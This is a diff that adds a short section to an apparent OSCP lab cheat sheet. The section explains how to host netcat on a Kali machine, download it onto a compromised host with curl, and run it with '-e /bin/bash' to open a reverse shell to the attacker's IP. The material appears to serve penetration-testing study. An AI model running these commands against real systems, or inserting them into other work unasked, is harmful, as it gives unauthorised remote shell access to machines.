@@ -958,6 +958,20 @@ wget -O /tmp/filename.ext https://example.com/file.ext
 Curl
 curl -o /tmp/filename.ext https://example.com/file.ext
 
+Linux NC
+in Kali, locate your NC:
+/usr/bin/nc
+
+copy it to your current folder:
+cd /usr/bin
+cp nc /home/kali/oscp/pgp/foldername
+
+host it and download it from remote shell:
+curl http://192.168.45.238/nc -o /tmp/nc 
+chmod +x /tmp/nc
+
+In remote shell: (WHERE 45.238 = KALI), run below to get a nc shell
+"/tmp/nc 192.168.45.238 1708 -e /bin/bash
 
 =====================================================================
 		6.) Priv Escalation
